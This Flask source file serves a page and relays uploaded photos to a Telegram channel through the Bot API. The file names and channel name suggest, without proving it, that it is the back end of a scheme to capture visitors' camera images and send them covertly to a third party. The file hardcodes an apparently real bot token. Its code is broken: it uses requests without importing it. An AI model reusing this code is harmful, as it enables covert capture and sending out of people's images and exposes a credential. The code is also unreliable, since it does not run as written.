from flask import Flask, render_template, request

app = Flask(__name__)

# Route for the index page
@app.route('/')
def index():
    return render_template('index.html')

# Route to receive the photo and send it to the Telegram channel
@app.route('/upload', methods=['POST'])
def upload():
    photo = request.files['photo']
    photo.save('captured_photo.jpg')  # Save the photo to a file

    # Send the photo to the Telegram channel using the Telegram Bot API
    telegram_bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg'
    telegram_channel_id = '@localipy'

    url = f'https://api.telegram.org/bot{telegram_bot_token}/sendPhoto'
    data = {'chat_id': telegram_channel_id}
    files = {'photo': open('captured_photo.jpg', 'rb')}
    response = requests.post(url, data=data, files=files)

    return 'Photo sent to Telegram channel'

if __name__ == '__main__':
    app.run()
